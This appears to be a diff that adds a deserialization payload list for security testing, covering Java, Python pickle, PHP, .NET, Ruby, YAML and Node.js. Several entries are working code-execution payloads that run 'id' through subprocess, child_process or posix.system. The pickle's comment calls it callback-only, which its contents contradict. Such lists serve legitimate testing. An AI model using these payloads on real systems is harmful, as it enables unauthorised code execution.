@@ -1,0 +1,29 @@
+# Deserialization Payloads — detection and safe exploitation indicators
+# Java serialized object markers (base64-encoded headers)
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA
+rO0ABXNyADJvcmcuYXBhY2hlLmNvbW1vbnM
+# Java gadget chain indicators (class names to search for)
+org.apache.commons.collections.functors.InvokerTransformer
+org.apache.commons.beanutils.BeanComparator
+com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
+org.springframework.beans.factory.ObjectFactory
+# Python pickle payloads (safe — trigger DNS/HTTP callbacks only)
+gASVKAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA1pZCA+IC9kZXYvbnVsbJSFlFKULg==
+# PHP serialized object injection
+O:8:"stdClass":1:{s:4:"test";s:4:"true";}
+a:1:{s:5:"admin";b:1;}
+O:4:"User":2:{s:8:"username";s:5:"admin";s:5:"admin";b:1;}
+O:10:"__destruct":0:{}
+# .NET ViewState payloads (indicators)
+__VIEWSTATE=/wEPDwUKMTY1NDU2MDE0Mg==
+# Ruby Marshal (base64)
+BAhJIgpIZWxsbwY6BkVU
+# YAML constructor injection
+!!python/object/apply:time.sleep [3]
+!!python/object/new:subprocess.check_output [['id']]
+!!ruby/object:Gem::Installer\ni: x
+!!java/object:java.lang.Runtime
+# Node.js deserialization
+{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}
+# MessagePack / BSON injection indicators
+\x83\xa4type\xa6object
